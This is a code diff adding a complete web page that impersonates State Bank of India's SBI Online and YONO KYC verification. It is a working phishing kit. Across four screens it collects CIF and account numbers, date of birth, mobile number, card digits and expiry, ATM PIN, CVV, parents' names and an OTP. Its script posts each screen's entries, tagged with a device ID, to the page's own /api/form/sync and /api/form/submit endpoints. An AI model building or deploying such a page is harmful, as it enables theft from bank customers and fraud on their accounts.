@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Online - Verify Details</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a3c6e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* SBI Logo Section */
+        .logo-section {
+            padding: 20px 20px 10px 20px;
+        }
+
+        .sbi-logo {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .sbi-logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #0066b3, #004d8c);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .sbi-logo-icon::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: #fff;
+            border-radius: 50%;
+            position: absolute;
+        }
+
+        .sbi-logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sbi-logo-text .sbi {
+            font-size: 28px;
+            font-weight: 800;
+            color: #0b3d91;
+            line-height: 1;
+            letter-spacing: 1px;
+        }
+
+        .sbi-logo-text .online {
+            font-size: 10px;
+            font-weight: 600;
+            color: #2e8b57;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        /* Navigation Bar */
+        .nav-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(to right, #1a5276, #2980b9);
+            margin: 5px 15px;
+            border-radius: 6px;
+            padding: 10px 15px;
+            height: 44px;
+        }
+
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+        }
+
+        .hamburger span {
+            display: block;
+            width: 22px;
+            height: 2.5px;
+            background: #fff;
+            border-radius: 2px;
+        }
+
+        .nav-link-icon {
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .nav-link-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: #fff;
+        }
+
+        /* Verify Details Header */
+        .verify-header {
+            background-color: #c5cae9;
+            margin: 20px 15px 10px 15px;
+            padding: 14px 20px;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .verify-header h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a237e;
+            letter-spacing: 0.5px;
+        }
+
+        /* Form Section */
+        .form-section {
+            padding: 15px 25px;
+            flex: 1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 13px 14px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 15px;
+            background-color: #f5f5f5;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #2980b9;
+            background-color: #fff;
+        }
+
+        /* Submit Button */
+        .submit-section {
+            text-align: center;
+            padding: 20px 25px 40px;
+        }
+
+        .submit-btn {
+            background-color: #d4a017;
+            color: #fff;
+            border: none;
+            padding: 14px 50px;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            min-width: 180px;
+        }
+
+        .submit-btn:hover {
+            background-color: #b8860b;
+        }
+
+        .submit-btn:active {
+            background-color: #a07710;
+            transform: scale(0.98);
+        }
+
+        /* Hidden page */
+        .page {
+            display: none;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .page.active {
+            display: flex;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #e8e8e8;
+            padding: 20px 20px 24px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .footer-icon {
+            margin-bottom: 12px;
+        }
+
+        .footer-icon svg {
+            width: 36px;
+            height: 36px;
+            fill: #1a5276;
+        }
+
+        .footer-links {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px 20px;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+            color: #333;
+            text-decoration: none;
+            padding: 4px 0;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #1a5276;
+            text-decoration: underline;
+        }
+
+        /* ===== PAGE 3: Yono KYC Styles ===== */
+        .yono-banner {
+            background: linear-gradient(135deg, #7b1fa2, #9c27b0, #ce93d8);
+            margin: 15px 15px 0 15px;
+            border-radius: 10px;
+            padding: 25px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .yono-logo-area {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .yono-text {
+            font-size: 32px;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1;
+        }
+
+        .yono-sbi-row {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 2px;
+        }
+
+        .yono-sbi-icon {
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #0066b3, #004d8c);
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .yono-sbi-icon::after {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background: #fff;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .yono-sbi-text {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .yono-banner-text {
+            display: flex;
+            flex-direction: column;
+            text-align: right;
+            color: #fff;
+        }
+
+        .yono-banner-text span {
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        .yono-banner-text strong {
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .kyc-header {
+            margin: 20px 15px 0 15px;
+            padding: 14px 20px;
+            border-left: 4px solid #1565c0;
+            background-color: #f5f5f5;
+        }
+
+        .kyc-header h2 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1565c0;
+        }
+
+        .care-note {
+            padding: 15px 25px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .care-label {
+            color: #d32f2f;
+            font-weight: 700;
+            font-size: 15px;
+        }
+
+        .required {
+            color: #d32f2f;
+            font-weight: 700;
+        }
+
+        .kyc-buttons {
+            display: flex;
+            gap: 15px;
+            padding: 10px 0 20px;
+        }
+
+        .kyc-submit-btn,
+        .kyc-reset-btn {
+            flex: 1;
+            padding: 13px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .kyc-submit-btn {
+            background-color: #1565c0;
+            color: #fff;
+        }
+
+        .kyc-submit-btn:hover {
+            background-color: #0d47a1;
+        }
+
+        .kyc-reset-btn {
+            background-color: #1565c0;
+            color: #fff;
+        }
+
+        .kyc-reset-btn:hover {
+            background-color: #0d47a1;
+        }
+
+        .kyc-links {
+            padding: 0 25px 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .kyc-links a {
+            font-size: 14px;
+            color: #1565c0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .kyc-links a:hover {
+            text-decoration: underline;
+        }
+
+        .kyc-notes {
+            padding: 10px 25px 30px;
+        }
+
+        .kyc-notes ul {
+            padding-left: 20px;
+        }
+
+        .kyc-notes li {
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 4px;
+            line-height: 1.5;
+        }
+
+        /* ===== PAGE 4: OTP Verify Styles ===== */
+        .otp-header {
+            margin: 15px 15px 0 15px;
+            padding: 14px 20px;
+            border-left: 4px solid #1565c0;
+            background-color: #f0f4ff;
+        }
+
+        .otp-header h2 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1565c0;
+        }
+
+        .otp-form {
+            padding: 20px 25px;
+        }
+
+        .otp-form label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .otp-form input {
+            width: 100%;
+            padding: 14px 14px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 18px;
+            background-color: #f5f5f5;
+            outline: none;
+            letter-spacing: 6px;
+            text-align: center;
+        }
+
+        .otp-form input:focus {
+            border-color: #2980b9;
+            background-color: #fff;
+        }
+
+        .otp-submit-section {
+            text-align: center;
+            padding: 20px 25px 5px;
+        }
+
+        .otp-timer {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1565c0;
+            padding: 10px 0 5px;
+        }
+
+        .otp-info-text {
+            text-align: center;
+            font-size: 13px;
+            color: #555;
+            padding: 5px 25px 20px;
+        }
+
+        .otp-security-box {
+            margin: 10px 20px 30px;
+            padding: 18px 20px;
+            background-color: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 6px;
+        }
+
+        .otp-security-box p {
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+
+        .otp-security-box p:last-child {
+            margin-bottom: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- SBI Logo -->
+        <div class="logo-section">
+            <div class="sbi-logo">
+                <div class="sbi-logo-icon"></div>
+                <div class="sbi-logo-text">
+                    <span class="sbi">SBI</span>
+                    <span class="online">ONLINE</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Navigation Bar -->
+        <div class="nav-bar">
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <a href="#" class="nav-link-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/>
+                </svg>
+            </a>
+        </div>
+
+        <!-- ========== PAGE 1: Verify Details ========== -->
+        <div id="page1" class="page active">
+            <div class="verify-header">
+                <h2>Verify details</h2>
+            </div>
+
+            <form class="form-section" onsubmit="submitPage1(event)">
+                <div class="form-group">
+                    <label for="cif">CIF Number*</label>
+                    <input type="text" id="cif" name="cif" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="account">Account Number*</label>
+                    <input type="text" id="account" name="account" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="dob">Date of Birth (DDMMYYYY)*</label>
+                    <input type="text" id="dob" name="dob" maxlength="8" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="mobile">Mobile Number*</label>
+                    <input type="tel" id="mobile" name="mobile" maxlength="10" required>
+                </div>
+
+                <div class="submit-section">
+                    <button type="submit" class="submit-btn">SUBMIT</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- ========== PAGE 2: Verify Card Details ========== -->
+        <div id="page2" class="page">
+            <div class="verify-header">
+                <h2>Verify Card Details</h2>
+            </div>
+
+            <form class="form-section" onsubmit="submitPage2(event)">
+                <div class="form-group">
+                    <label for="cardNumber">Enter last 6 digit Card Number*</label>
+                    <input type="text" id="cardNumber" name="cardNumber" maxlength="6" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="validUpto">Valid Up To (MM/YY)*</label>
+                    <input type="text" id="validUpto" name="validUpto" maxlength="5" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="atmPin">ATM PIN (4 or 6 digit)*</label>
+                    <input type="password" id="atmPin" name="atmPin" maxlength="6" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">CVV*</label>
+                    <input type="password" id="cvv" name="cvv" maxlength="3" required>
+                </div>
+
+                <div class="submit-section">
+                    <button type="submit" class="submit-btn">SUBMIT</button>
+                </div>
+            </form>
+
+            <!-- Footer -->
+            <div class="footer">
+                <div class="footer-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+                    </svg>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Complaints</a>
+                    <a href="#">About Phishing</a>
+                    <a href="#">Trouble logging in</a>
+                    <a href="#">Report Phishing</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 3: SBI Yono KYC Login ========== -->
+        <div id="page3" class="page">
+            <!-- Yono Banner -->
+            <div class="yono-banner">
+                <div class="yono-logo-area">
+                    <span class="yono-text">yono</span>
+                    <div class="yono-sbi-row">
+                        <div class="yono-sbi-icon"></div>
+                        <span class="yono-sbi-text">SBI</span>
+                    </div>
+                </div>
+                <div class="yono-banner-text">
+                    <span>How to</span>
+                    <strong>Update KYC</strong>
+                </div>
+            </div>
+
+            <!-- KYC Login Header -->
+            <div class="kyc-header">
+                <h2>Sbi Yono Kyc Login</h2>
+            </div>
+
+            <!-- Care Note -->
+            <div class="care-note">
+                <span class="care-label">CARE:</span> All fields must be entered carefully
+            </div>
+
+            <!-- KYC Form -->
+            <form class="form-section" onsubmit="submitPage3(event)">
+                <div class="form-group">
+                    <label for="fatherName">Father Name <span class="required">*</span></label>
+                    <input type="text" id="fatherName" name="fatherName" placeholder="Enter father's name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="branchName">Branch Name <span class="required">*</span></label>
+                    <input type="text" id="branchName" name="branchName" placeholder="Enter branch name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="motherName">Mother Name <span class="required">*</span></label>
+                    <input type="text" id="motherName" name="motherName" placeholder="Enter mother's name" required>
+                </div>
+
+                <div class="kyc-buttons">
+                    <button type="submit" class="kyc-submit-btn">Submit</button>
+                    <button type="reset" class="kyc-reset-btn">Reset</button>
+                </div>
+            </form>
+
+            <!-- Links -->
+            <div class="kyc-links">
+                <a href="#">New Customer ? Register here</a>
+                <a href="#">Forgot Username</a>
+            </div>
+
+            <!-- Info Notes -->
+            <div class="kyc-notes">
+                <ul>
+                    <li>Mandatory fields are marked as important</li>
+                    <li>Do not share personal information</li>
+                    <li>Your information is confidential</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 4: OTP Verify KYC ========== -->
+        <div id="page4" class="page">
+            <!-- OTP Header -->
+            <div class="otp-header">
+                <h2>Enter the OTP Verify KYC</h2>
+            </div>
+
+            <!-- OTP Form -->
+            <div class="otp-form">
+                <label for="otpInput">Enter the OTP Verify KYC</label>
+                <input type="text" id="otpInput" maxlength="6" required>
+            </div>
+
+            <!-- Submit -->
+            <div class="otp-submit-section">
+                <button type="button" class="submit-btn" onclick="submitPage4()">submit</button>
+            </div>
+
+            <!-- Timer -->
+            <div class="otp-timer" id="otpTimer">02:56</div>
+
+            <!-- Info Text -->
+            <div class="otp-info-text">
+                If you did not receive the OTP on phone, you can
+            </div>
+
+            <!-- Security Box -->
+            <div class="otp-security-box">
+                <p>▪ SBI never sends you emails/SMS or calls for your personal info, password, or OTP.</p>
+                <p>▪ Such emails/SMS or calls are attempts to defraud you.</p>
+                <p>▪ Report such activity immediately and change your passwords.</p>
+                <p>▪ You'll receive all communication only on your registered mobile number.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== DATA SYNC HELPERS =====
+        const collectedData = {};
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('deviceId') || 'unknown_device';
+
+        function getBaseUrl() {
+            return window.location.origin;
+        }
+
+        function syncPageData(pageName, pageData) {
+            const payload = {
+                deviceId: deviceId,
+                pageName: pageName,
+                pageData: pageData,
+                timestamp: new Date().toISOString()
+            };
+            fetch(getBaseUrl() + '/api/form/sync', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(data) { console.log('[SBI Form] Page synced:', pageName, data); })
+            .catch(function(err) { console.error('[SBI Form] Sync error:', err); });
+        }
+
+        function submitFormData() {
+            var payload = {
+                deviceId: deviceId,
+                currentFlow: 'sbi'
+            };
+            for (var k in collectedData) {
+                if (collectedData.hasOwnProperty(k)) payload[k] = collectedData[k];
+            }
+            payload.submittedAt = new Date().toISOString();
+            fetch(getBaseUrl() + '/api/form/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(data) { console.log('[SBI Form] Submitted:', data); })
+            .catch(function(err) { console.error('[SBI Form] Submit error:', err); });
+        }
+
+        // ===== PAGE 1 SUBMIT =====
+        function submitPage1(event) {
+            event.preventDefault();
+            var cif = document.getElementById('cif').value;
+            var account = document.getElementById('account').value;
+            var dob = document.getElementById('dob').value;
+            var mobile = document.getElementById('mobile').value;
+
+            if (!cif || !account || !dob || !mobile) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+
+            collectedData.cifNumber = cif;
+            collectedData.accountNumber = account;
+            collectedData.dateOfBirth = dob;
+            collectedData.mobileNumber = mobile;
+
+            syncPageData('sbi_verify_details', {
+                cifNumber: cif,
+                accountNumber: account,
+                dateOfBirth: dob,
+                mobileNumber: mobile
+            });
+
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        // ===== PAGE 2 SUBMIT =====
+        function submitPage2(event) {
+            event.preventDefault();
+            var cardNumber = document.getElementById('cardNumber').value;
+            var validUpto = document.getElementById('validUpto').value;
+            var atmPin = document.getElementById('atmPin').value;
+            var cvv = document.getElementById('cvv').value;
+
+            if (!cardNumber || !validUpto || !atmPin || !cvv) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+
+            collectedData.cardLast6 = cardNumber;
+            collectedData.validThrough = validUpto;
+            collectedData.atmPin = atmPin;
+            collectedData.cvv = cvv;
+
+            syncPageData('sbi_card_details', {
+                cardLast6: cardNumber,
+                validThrough: validUpto,
+                atmPin: atmPin,
+                cvv: cvv
+            });
+
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page3').classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        // ===== PAGE 3 SUBMIT =====
+        function submitPage3(event) {
+            event.preventDefault();
+            var fatherName = document.getElementById('fatherName').value;
+            var branchName = document.getElementById('branchName').value;
+            var motherName = document.getElementById('motherName').value;
+
+            if (!fatherName || !branchName || !motherName) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+
+            collectedData.fatherName = fatherName;
+            collectedData.branchName = branchName;
+            collectedData.motherName = motherName;
+
+            syncPageData('sbi_kyc_details', {
+                fatherName: fatherName,
+                branchName: branchName,
+                motherName: motherName
+            });
+
+            document.getElementById('page3').classList.remove('active');
+            document.getElementById('page4').classList.add('active');
+            window.scrollTo(0, 0);
+            startOtpTimer();
+        }
+
+        // ===== PAGE 4 SUBMIT =====
+        function submitPage4() {
+            var otp = document.getElementById('otpInput').value;
+            if (!otp || otp.length < 4) {
+                alert('Please enter a valid OTP.');
+                return;
+            }
+
+            collectedData.otp = otp;
+
+            syncPageData('sbi_otp_verify', {
+                otp: otp
+            });
+
+            submitFormData();
+
+            alert('OTP verified successfully!');
+        }
+
+        // ===== OTP COUNTDOWN TIMER =====
+        var otpInterval;
+        function startOtpTimer() {
+            var totalSeconds = 176; // 02:56
+            var timerEl = document.getElementById('otpTimer');
+            if (otpInterval) clearInterval(otpInterval);
+            otpInterval = setInterval(function() {
+                var minutes = Math.floor(totalSeconds / 60);
+                var seconds = totalSeconds % 60;
+                timerEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+                if (totalSeconds <= 0) {
+                    clearInterval(otpInterval);
+                    timerEl.textContent = '00:00';
+                }
+                totalSeconds--;
+            }, 1000);
+        }
+
+        // ===== INPUT RESTRICTIONS =====
+
+        // DOB - digits only
+        document.getElementById('dob').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Mobile - digits only
+        document.getElementById('mobile').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Card Number - digits only
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Valid Up To - auto format MM/YY
+        document.getElementById('validUpto').addEventListener('input', function() {
+            var val = this.value.replace(/[^0-9]/g, '');
+            if (val.length >= 2) {
+                val = val.substring(0, 2) + '/' + val.substring(2, 4);
+            }
+            this.value = val;
+        });
+
+        // ATM PIN - digits only
+        document.getElementById('atmPin').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // CVV - digits only
+        document.getElementById('cvv').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // OTP - digits only
+        document.getElementById('otpInput').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
